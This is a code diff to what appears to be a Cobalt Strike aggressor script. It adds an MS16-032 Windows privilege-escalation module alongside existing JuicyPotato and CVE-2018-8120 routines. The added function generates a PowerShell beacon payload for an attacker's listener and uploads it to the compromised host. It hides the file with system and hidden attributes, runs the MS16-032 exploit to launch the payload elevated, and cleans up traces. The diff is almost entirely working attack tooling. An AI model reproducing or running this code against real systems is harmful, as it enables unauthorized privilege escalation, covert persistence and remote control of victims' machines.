@@ -3,7 +3,7 @@
 
 sub RunJuicyPotato{
     local('$payload $handle $call $port $id $fname $total');
-    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6", "!", "@", "#");
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
     $total = 8;
     $call = $3['Call'];
     $port = $3['Port'];
@@ -57,6 +57,30 @@ sub CVE_2018_8120{
     bshell($bid,"del /F /S /Q /AH $Rch $+ .exe");
 }
 
+sub ms16032{
+    local('$Rch $payload $fname');
+    @array = @("a", "b", "c", "d", "e", "f", "g", "1", "2", "3", "4", "5", "6");
+    $total = 8;
+    while($total >= 0){
+        $fname = $fname.rand(@array);
+        $total = $total - 1;
+    }
+    $fname = $fname.".cmd";
+    $Rch = "x86";
+    if (beacon_info($bid,"is64") == 1){
+        $Rch = "x64";
+    }
+    $payload = powershell($3['listener'], false, $Rch);
+    $handle = openf("> $+ $fname");
+    writeb($handle, $payload);
+    closef($handle);
+    bupload($bid, $fname);
+    bshell($bid, "attrib \" $+ $fname\" +s +h");
+    bpowershell_import($bid, script_resource("script/MS16-032.ps1"));
+	bpowershell($bid, "Invoke-MS16-032  $+ $fname");
+    exec("cmd.exe /C del /F ".$fname);
+}
+
 #append menus
 
 
@@ -78,6 +102,16 @@ sub CVE_2018_8120{
             $bid = $1['@'];
             $Dialog = dialog("CVE-2018-8120",%(bid => $bid),&CVE_2018_8120);
             dialog_description($Dialog, "when the Win32k component fails to properly handle objects in memory\, aka \"Win32k Elevation of Privilege Vulnerability.\"");
+            drow_listener($Dialog, "listener", "Listener: ");
+            dbutton_action($Dialog, "Exploit");
+            dialog_show($Dialog);
+        }
+
+
+        item "MS16-032"{
+            $bid = $1['@'];
+            $Dialog = dialog("MS16-032",%(bid => $bid),&ms16032);
+            dialog_description($Dialog, "The vulnerability could allow elevation of privilege if the Windows Secondary Logon Service fails to properly manage request handles in memory.");
             drow_listener($Dialog, "listener", "Listener: ");
             dbutton_action($Dialog, "Exploit");
             dialog_show($Dialog);
